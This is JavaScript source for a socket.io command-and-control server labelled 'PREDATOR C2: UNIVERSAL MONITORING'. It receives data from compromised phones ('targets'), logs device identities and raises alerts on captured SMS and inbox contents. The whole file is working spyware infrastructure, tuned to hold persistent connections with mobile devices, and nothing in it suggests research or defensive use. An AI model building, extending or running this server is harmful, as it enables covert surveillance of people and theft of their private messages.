const http = require('http');
const server = http.createServer((req, res) => {
    res.writeHead(200);
    res.end("PREDATOR SYSTEM ACTIVE 🚀");
});

const io = require('socket.io')(server, {
    // ✅ Mobile networks are slow — give the client 60s before declaring dead
    pingTimeout: 60000,
    // ✅ Ping every 25s to keep NAT/firewall mappings alive
    pingInterval: 25000,
    transports: ['websocket', 'polling'],
    cors: { origin: "*" },
    // ✅ Allow upgrade from polling to websocket (stability fallback)
    allowUpgrades: true,
    // ✅ Increase buffer size for queued messages during reconnection
    maxHttpBufferSize: 1e6,
});

// Track connected devices
const connectedDevices = new Map();

console.log("-----------------------------------------");
console.log("💀 PREDATOR C2: UNIVERSAL MONITORING 💀");
console.log("Status: Extreme Speed & Stability Active");
console.log("-----------------------------------------");

io.on('connection', (socket) => {
    const connectTime = new Date().toLocaleTimeString();
    console.log(`\n[+] LIVE CONNECTION: ${socket.id} at ${connectTime}`);
    console.log(`    Transport: ${socket.conn.transport.name}`);

    // Track transport upgrades (polling -> websocket)
    socket.conn.on('upgrade', (transport) => {
        console.log(`[↑] ${socket.id} upgraded to: ${transport.name}`);
    });

    socket.on("device_info", (info) => {
        console.log("📱 DEVICE IDENTIFIED: " + info);
        // Store device info mapped to socket
        connectedDevices.set(socket.id, { info, connectedAt: Date.now() });
    });

    socket.on('phone_data', (packet) => {
        const time = new Date().toLocaleTimeString();

        if (packet.includes("SMS") || packet.includes("INBOX")) {
            console.log(`\n\n=========================================`);
            console.log(`[${time}] 🚨 ALERT: ${packet}`);
            console.log(`=========================================\n`);
        }
        else if (packet.includes("BATTERY")) {
            process.stdout.write(`\r[${time}] 🔋 STATUS: ${packet}          `);
        }
    });

    // ✅ Handle ping — client can send manual keepalive
    socket.on('ping_alive', () => {
        socket.emit('pong_alive');
    });

    // ✅ Handle errors gracefully
    socket.on('error', (err) => {
        console.log(`[!] Socket error from ${socket.id}: ${err.message}`);
    });

    socket.on('disconnect', (reason) => {
        console.log(`\n[-] Target Offline: ${socket.id} (Reason: ${reason})`);
        connectedDevices.delete(socket.id);

        // Log whether this was a clean or dirty disconnect
        if (reason === 'transport close' || reason === 'transport error') {
            console.log(`    ⚠️ Network-level disconnect — client will auto-reconnect`);
        } else if (reason === 'ping timeout') {
            console.log(`    ⚠️ Ping timeout — client may be in deep sleep`);
        } else if (reason === 'client namespace disconnect') {
            console.log(`    ❌ Client intentionally disconnected`);
        }
    });
});

// ✅ Log connected clients every 60s for monitoring
setInterval(() => {
    const count = connectedDevices.size;
    if (count > 0) {
        console.log(`\n[*] Active Connections: ${count}`);
        connectedDevices.forEach((dev, id) => {
            const uptime = Math.round((Date.now() - dev.connectedAt) / 60000);
            console.log(`    └─ ${id} | ${dev.info || 'Unknown'} | Uptime: ${uptime}min`);
        });
    }
}, 60000);

// Port 3000 par listening
server.listen(3000, '0.0.0.0', () => {
    console.log("C2 Server is running on Port 3000...");
});